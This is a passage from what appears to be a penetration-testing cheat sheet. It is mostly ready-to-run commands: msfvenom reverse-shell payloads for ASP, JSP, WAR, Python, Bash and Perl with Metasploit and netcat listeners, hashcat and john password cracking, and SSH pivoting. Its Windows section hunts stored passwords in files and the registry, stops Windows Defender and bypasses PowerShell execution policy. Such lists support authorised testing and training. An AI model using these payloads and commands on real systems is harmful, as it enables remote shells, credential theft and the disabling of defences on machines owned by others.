cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### Python

```
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

### Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

### Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

### Listener

#### Metasploit

```
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST <LHOST>
set LPORT <LPORT>
set ExitOnSession false
exploit -j -z
```

#### Netcat

```
nc -lvp <PORT>
```

------

## PASSWORD CRACKING

### Online

```
Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash
```

### Hashcat

#### Linux password

```
hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Windows password

```
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Others

```
hashcat --example-hashes | grep -i '<BEGINNING_OF_HASH>'
```

#### Rules

```
https://github.com/NotSoSecure/password_cracking_rules
```

### John

```
john --wordlist=<PASSWORDS_LIST> hash.txt
```

------

## PIVOTING

### Sshuttle

```
sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
```

### Proxychains

```
ssh -f -N -D 9050 <USER>@<IP>
proxychains <COMMAND>
```

### Interesting link

```
https://artkond.com/2017/03/23/pivoting-guide/
```


### Linux

```
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

### Windows

```
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```



### Adjust Interactive shell

```
stty size # Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
```

------

## USEFUL LINUX COMMANDS

### Find a file

```
locate <FILE>
find / -name "<FILE>"
```

### Active connection

```
netstat -lntp
```

### List all SUID files

```
find / -perm -4000 2>/dev/null
```

### Determine the current version of Linux

```
 cat /etc/issue
```

### Determine more information about the environment

```
uname -a
```

### List processes running

```
ps -faux
```

### List the allowed (and forbidden) commands for the invoking use

```
sudo -l
```

------

## USEFUL WINDOWS COMMANDS

```
net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s "<FILE>"
```
